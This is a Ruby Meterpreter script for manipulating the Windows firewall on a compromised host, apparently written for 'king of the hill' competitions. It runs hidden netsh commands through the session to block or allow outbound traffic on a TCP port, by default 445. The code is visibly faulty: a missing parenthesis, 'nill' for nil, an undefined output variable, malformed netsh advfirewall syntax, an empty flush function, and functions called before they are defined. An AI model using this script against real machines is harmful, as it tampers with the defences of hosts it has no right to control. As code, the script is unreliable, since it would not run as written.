#
# Meterpreter script to enable windows firewall
# Usefull for king of the hill type activities
#

@client = client
@port = '445' #probably want to block this

opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help Menu" ],
	"-d" => [ false, "Disable TCP port" ],
	"-e" => [ false, "Enable TCP port" ],
	"-p" => [ false, "Port number" ],
	"-f" => [ false, "Flush Firewall rules" ],
	"-s" => [ false, "Display Firewall status"]
)

opts.parse(args) { |opt, id, val|
	case opt
	when "-d"
		firewall_disable_tcp_port(@port)	
	when "-e"
		firewall_enable_tcp_port(@port)	
	when "-p"
		@port = val
	when "-f"
		firewall_flush
	when "-s"
		firewall_status
	when "-h"
		print_line "Firewall -- Windows Firewall Manipulation"
		print_line 
		print_line "Quick script for enabling and disabling "
		print_line "different firewall features using Windows "
		print_line "netsh advfirewall"
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}
# Print inital firewall status
def firewall_status() 
	fw_status_cmd = "netsh firewall show config"
	print_status("Getting firewall status")
	print_status("\trunning command #{fw_status_cmd}"
	exec_cmd(fw_status_cmd)
end

# Enable tcp ports
def firewall_enable_tcp_port(port)
	cmd = "netsh advfirewall add rule name=\"Allow #{port}\" dir=out localport=#{port} protocol=TCP action=allow"
	print_status("Enabling #{port}")
	exec_cmd(cmd)
end

# Disable tcp ports
def firewall_disable_tcp_port(port)
	cmd = "netsh advfirewall add rule name=\"DisAllow #{port}\" dir=out localport=#{port} protocol=TCP action=deny"
	print_status("Disabling #{port}")
	exec_cmd(cmd)
end

# Flush all firewall rules
def firewall_flush()
	
	#cmd = "netsh advfirewall "
end
# Execute commands 
def exec_cmd(command)
	print_status("Executing #{command}")
	r = @client.sys.process.execute(command, nill, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		cmdout << d
	end
	r.channel.close
	r.close
end

